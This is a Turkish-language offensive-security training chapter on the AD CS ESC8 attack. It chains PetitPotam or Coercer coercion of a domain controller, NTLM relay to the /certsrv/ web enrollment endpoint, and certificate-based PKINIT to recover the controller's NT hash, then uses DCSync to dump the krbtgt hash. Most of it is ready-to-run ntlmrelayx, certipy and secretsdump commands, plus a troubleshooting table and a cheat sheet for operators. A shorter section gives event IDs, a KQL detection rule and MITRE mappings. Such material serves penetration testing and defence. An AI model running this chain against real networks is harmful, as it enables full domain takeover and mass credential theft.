## 1. Genel Bakış ve ESC8 Saldırı Mimarisi

Active Directory Certificate Services (AD CS) ortamlarında kullanılan **Web Enrollment (`/certsrv/`)** arayüzü, kullanıcıların ve yöneticilerin web tarayıcısı üzerinden dijital sertifika talep edebilmesini sağlayan bir IIS web uygulamasıdır.

Bu web arayüzü kurulduğunda varsayılan olarak iki ölümcül zaaf taşır:
1. Web arayüzü kimlik doğrulama yöntemi olarak **NTLM** protokolünü destekler.
2. HTTP/HTTPS bağlantıları üzerinde **Genişletilmiş Kimlik Doğrulama Koruması (EPA - Extended Protection for Authentication / Channel Binding Tokens)** ve imzalama varsayılan olarak **kapalıdır**.

Bu iki zaaf [08.2 Koersiyon](./08.2_PetitPotam_PrinterBug_DFSCoerce.md) ile birleştiğinde **Active Directory tarihindeki en hızlı etki alanı ele geçirme zincirini (ESC8 Kill Chain)** meydana getirir:
- Saldırgan bir Domain Controller'ı (DC01$) koersiyonla tetikler.
- Gelen NTLM kimlik doğrulamasını AD CS Web Enrollment arayüzüne relay eder.
- Web servisi hiçbir imza denetimi yapmadan DC01$ adına **`DomainController` şablonuyla geçerli bir makine sertifikası (`.pfx`)** üretir.
- Saldırgan sertifikayı PKINIT ile Kerberos TGT biletine ve NT hash'ine dönüştürerek doğrudan **DCSync ([09.1](../Modul_09_Domain_Hakimiyeti_ve_Kalicilik/09.1_DCSync_Saldirisi_ve_Mimikatz.md))** yapar ve etki alanının tüm parola veritabanını ele geçirir.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                       ESC8 RELAY KILL CHAIN MİMARİSİ                        │
└─────────────────────────────────────────────────────────────────────────────┘
                                      │
  [DOMAIN CONTROLLER (DC01$)]    [SALDIRGAN (ntlmrelayx / Certipy)]      [AD CS WEB ENROLLMENT]
              │                                │                                    │
              │◀── 1. RPC Koersiyon Çağrısı ───│                                    │
              │    (PetitPotam / Coercer)      │                                    │
              │                                │                                    │
              │── 2. NTLM HTTP/SMB Bağlantısı ─▶│                                    │
              │    (DC01$ NetNTLMv2 Auth)      │── 3. NTLM Relay (HTTP POST) ──────▶│
              │                                │    (http://ca/certsrv/certfnsh.asp)│
              │                                │                                    │
              │                                │                                    │ CA Sertifikayı
              │                                │                                    │ DC01$ Adına İmzalar
              │                                │◀── 4. DC01$.pfx Teslim Edilir ─────│
              │                                │                                    │
              │                                ▼
              │               [5. PKINIT Kimlik Doğrulama (certipy auth)]
              │               - KDC'den DC01$ TGT Bileti Alınır
              │               - UnPAC-the-Hash ile DC01$ NT Hash Çözülür
              │                                │
              │                                ▼
              │               [6. DCSync İle Tam Hakimiyet (secretsdump)]
              │◀── 7. DS-Replication Talebi ───│
              │    (krbtgt Hash'i Alınır!)     │
```

## 2. Derinlemesine Teknik Mekanizmalar

### 2.1 Web Enrollment Arayüzü ve CSR Üretimi
`ntlmrelayx --adcs --template DomainController` komutu çalıştığında:
1. Dinleyici yerel olarak 2048-bit RSA anahtar çifti oluşturur ve PKCS#10 formatında bir Sertifika İmzalama Talebi (CSR) derler.
2. DC'den gelen NTLM el sıkışması `/certsrv/certfnsh.asp` endpoint'ine iletilir.
3. Başarılı kimlik doğrulamanın ardından hazırlanan CSR HTTP POST gövdesinde CA'ya sunulur.
4. CA web arayüzü, oturum açan kimliğin `DC01$` olduğunu doğrular ve isteği onaylayarak imzalı PKCS#7 sertifikasını HTTP yanıtı içinde saldırgana teslim eder.

### 2.2 Extended Protection for Authentication (EPA) Neden Engeldir?
HTTPS üzerinden çalışan bir Web Enrollment arayüzünde EPA (Channel Binding Tokens - CBT) aktif edildiğinde:
- İstemci (kurban), TLS oturumunun özetini (`cbData` hash) NetNTLMv2 Type 3 mesajının `MsvAvChannelBindings` alanına mühürler.
- Saldırgan bu oturumu CA'ya relay ettiğinde, saldırgan ile CA arasındaki TLS kanalı farklı olduğundan kanal bağlama karması uyuşmaz.
- CA isteği `401 Unauthorized` veya `403.16 Channel Binding Error` ile reddeder.
- Dolayısıyla ESC8 saldırısının yaşaması, **kurumun Web Enrollment üzerinde EPA yapılandırmamış olmasına** bağlıdır.

### 2.3 UnPAC-the-Hash ile DC Makine Parolasını Çözme
Elde edilen `dc01.pfx` sertifikası `certipy auth -pfx dc01.pfx` komutuna verildiğinde:
- KDC ile PKINIT Diffie-Hellman anahtar değişimi yapılır ve DC01$ adına Kerberos TGT bileti alınır.
- KDC, geriye dönük NTLM uyumluluğu için TGT içindeki `PAC_CREDENTIAL_INFO` bloğuna DC01$ hesabının açık **NT hash'ini** yerleştirir.
- Certipy bu bloğu deşifre ederek ekrana `DC01$ NT hash` değerini yazar.
- Böylece saldırgan bilet taşımak zorunda bile kalmadan doğrudan Pass-the-Hash ile DC'ye bağlanabilir.

## 3. Pratik Sömürü Senaryoları ve Araç Kullanımı

### Senaryo 1: Impacket ntlmrelayx + PetitPotam ile Klasik ESC8 Zinciri
```bash
# 1. Terminal 1: ntlmrelayx dinleyicisini CA web servisine yönlendirerek başlat
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Terminal 2: PetitPotam ile Domain Controller'ı dinleyiciye zorla
python3 PetitPotam.py -u jdoe -p 'Welcome123!' -d corp.local 10.10.10.200 10.10.10.5

# 3. Terminal 1 konsolunda üretilen Base64 sertifikayı dc01.pfx olarak kaydet
# (ntlmrelayx sertifikayı otomatik olarak yerel dizine .pfx olarak yazar)

# 4. Certipy ile sertifikayı doğrula ve TGT + NT hash elde et
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.5

# 5. DC01$ kimliğiyle DCSync çalıştırarak tüm etki alanı hash'lerini dök
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -k -no-pass corp.local/'DC01$'@10.10.10.5 -just-dc-user krbtgt
```

### Senaryo 2: Certipy ile Tam Entegre ESC8 Relay
```bash
# 1. Terminal 1: Certipy'nin dahili relay motorunu başlat
certipy relay -target 'http://ca01.corp.local/certsrv/certfnsh.asp' -template 'DomainController'

# 2. Terminal 2: Coercer ile DC'yi tetikle
coercer coerce -u jdoe -p 'Welcome123!' -d corp.local -l 10.10.10.200 -t 10.10.10.5

# 3. Certipy sertifikayı alır almaz otomatik olarak PKINIT yapar ve NT hash'i döker:
# [*] Got hash for 'DC01$@corp.local': aad3b...:28f98e0c5e63078b8474ba0c4d5d7476
```

### Senaryo 3: Üye Sunucu veya Standart Kullanıcı Relay Edildiğinde
```bash
# Eğer koersiyon yapılan makine bir DC değil standart bir sunucu ise şablon Machine seçilir
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine

# Kullanıcı oturumu yakalandığında ise User şablonu kullanılır
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template User
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata / İstisna Mesajı | Kök Neden Analizi | Kesin Çözüm ve Operasyonel Adım |
|---|---|---|
| `Got error: 401 Unauthorized / Channel Binding Mismatch` | CA Web Enrollment servisinde EPA (Extended Protection) aktif tutuluyor. | EPA açıkken HTTP/HTTPS relay çalışmaz; LDAP veya SMB tabanlı diğer relay vektörlerine yönelin. |
| `CERTSRV_E_TEMPLATE_DENIED` | Talep edilen `DomainController` şablonu Web Enrollment üzerinde yayınlanmamış (published) değil. | `--template Machine` veya `--template KerberosAuthentication` şablonlarını deneyin. |
| `Request ID is pending (Manager Approval)` | Şablonda yönetici onayı şartı aranıyor; sertifika beklemede kaldı. | Onay istemeyen alternatif bilgisayar şablonlarını hedefleyin veya ESC7 yetkisi arayın. |
| `Failed to connect to /certsrv/certfnsh.asp (404 Not Found)` | CA üzerinde Web Enrollment rolü kurulu değil veya IIS servisi durdurulmuş. | CA'nın web arayüzünü tarayın (`curl -I http://ca/certsrv/`); kapalıysa ESC1/ESC4 gibi şablon zafiyetlerine dönün. |
| `KDC_ERR_CLIENT_NAME_MISMATCH on PKINIT` | Alınan sertifikadaki Subject adı ile kimlik doğrulaması yapılan hesabın sAMAccountName değeri uyuşmuyor. | Bilgisayar hesaplarında adın sonuna `$` koyulduğundan emin olun (`corp.local/'DC01$'`). |
| `DCSync Access Denied with captured cert` | Sertifika DC yerine sıradan bir üye sunucuya aittir; replikasyon yetkisi yoktur. | Koersiyon komutunda hedef IP olarak mutlaka Domain Controller'ı (`DC01`) tetikleyin. |

## 5. OPSEC ve Karşı Tespit (IOC & Telemetry)

### 5.1 Olay Günlüğü İmzaları (Windows Security Logs)
- **Event ID 4886 (Sertifika Talebi Alındı):** CA sunucusunda `Requester: CORP\DC01$` adına talep düşer ancak isteğin geldiği kaynak IP adresi saldırgan makinesidir.
- **Event ID 4887 (Sertifika Verildi):** `DomainController` şablonundan sertifika düzenlendiğini belgeler.
- **Event ID 4768 (PKINIT Kerberos TGT Talebi):** `DC01$` makinesinin kendi IP'si haricinde bir IP üzerinden PKINIT ile oturum açması en kritik alarmdır.
- **Event ID 4662 (Dizin Replikasyonu):** Bilinen DC IP adresleri haricindeki bir adresten `DS-Replication-Get-Changes-All` yetkisinin kullanılması (DCSync tespiti).

### 5.2 SIEM / EDR Tespit Kuralı (KQL / Sigma)
```kql
// KQL: ESC8 İmzası - Makine Hesabının CA Üzerinden DomainController Sertifikası Alması
SecurityEvent
| where EventID == 4887
| extend RequesterAccount = tostring(parse_json(ExtendedProperties).Requester)
| extend TemplateName = tostring(parse_json(ExtendedProperties).CertificateTemplate)
| where RequesterAccount endswith "$" and TemplateName =~ "DomainController"
| project TimeGenerated, Computer, RequesterAccount, TemplateName, SerialNumber = tostring(parse_json(ExtendedProperties).SerialNumber)
```

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Operasyonel Kullanım Aşaması |
|---|---|---|
| **T1557.001** | Adversary-in-the-Middle: LLMNR/NBT-NS and Relay | NTLM kimlik doğrulamasının Web Enrollment servisine relay edilmesi. |
| **T1187** | Forced Authentication | PetitPotam ile Domain Controller'ın zorlanması. |
| **T1649** | Steal or Forge Authentication Certificates | Web Enrollment üzerinden sahte DC makine sertifikası çıkarılması. |
| **T1003.006** | OS Credential Dumping: DCSync | Alınan sertifika ile etki alanı parola veritabanının çalınması. |

## 6. Hızlı Referans / Cheat Sheet

### Komut 1: impacket-ntlmrelayx ile ESC8 Dinleyicisi Başlatma
```bash
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
- **Ne Yapar?** AD CS Web Enrollment arayüzünü hedefleyen NTLM relay dinleyicisi açar ve gelen makineye DC sertifikası üretir.
- **Ne Zaman Kullanılır?** PetitPotam koersiyonu tetiklenmeden hemen önce.
- **Parametreler:** `-t`: Web enrollment URL'i; `--adcs`: AD CS sömürü modu; `--template`: Talep edilecek şablon.

### Komut 2: PetitPotam ile DC'yi Dinleyiciye Zorlama
```bash
python3 PetitPotam.py -u jdoe -p 'Welcome123!' -d corp.local 10.10.10.200 10.10.10.5
```
- **Ne Yapar?** DC01 sunucusunu tetikleyerek `10.10.10.200` adresindeki ntlmrelayx dinleyicisine bağlanmaya zorlar.
- **Ne Zaman Kullanılır?** Relay dinleyicisi hazır olduğunda kimlik akışını başlatmak için.
- **Parametreler:** `10.10.10.200`: Saldırgan dinleyici IP'si; `10.10.10.5`: Hedef DC IP'si.

### Komut 3: Certipy ile Tek Komutta ESC8 Relay Dinleyicisi
```bash
certipy relay -target 'http://ca01.corp.local/certsrv/certfnsh.asp' -template 'DomainController'
```
- **Ne Yapar?** Certipy'nin yerel relay motorunu başlatarak sertifika talebini ve PKINIT oturum açmasını otomatikleştirir.
- **Ne Zaman Kullanılır?** Impacket yerine tek araçta sertifika ve NT hash dökümü almak için.
- **Parametreler:** `-target`: Hedef CA web adresi; `-template`: Şablon adı.

### Komut 4: Elde Edilen DC Sertifikası ile TGT ve NT Hash Alma
```bash
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.5
```
- **Ne Yapar?** ESC8 ile ele geçirilen `dc01.pfx` dosyasını kullanarak PKINIT ile TGT çeker ve UnPAC ile NT hash'i çözer.
- **Ne Zaman Kullanılır?** Sertifika diske yazıldıktan hemen sonra.
- **Parametreler:** `-pfx`: Sertifika dosya yolu; `-dc-ip`: DC IP adresi.

### Komut 5: Alınan Bilet ile DCSync İcrası
```bash
export KRB5CCNAME=dc01.ccache && impacket-secretsdump -k -no-pass corp.local/'DC01$'@10.10.10.5 -just-dc-user krbtgt
```
- **Ne Yapar?** Yakalanan DC makine hesabı biletiyle etki alanının `krbtgt` hash'ini dökümler.
- **Ne Zaman Kullanılır?** ESC8 saldırısını etki alanı yöneticiliğine taşımak için.
- **Parametreler:** `-just-dc-user krbtgt`: Hedef hesabı filtreler.

### Komut 6: Web Enrollment Servisinin Ayakta Olduğunu Doğrulama
```bash
curl -s -I http://ca01.corp.local/certsrv/ | grep "HTTP/"
```
- **Ne Yapar?** Hedef CA üzerinde `/certsrv/` Web Enrollment servisinin kurulu ve erişilebilir olup olmadığını test eder.
- **Ne Zaman Kullanılır?** Saldırı zincirini başlatmadan önce keşif aşamasında.
- **Parametreler:** `-I`: Yalnızca HTTP başlıklarını çeker.
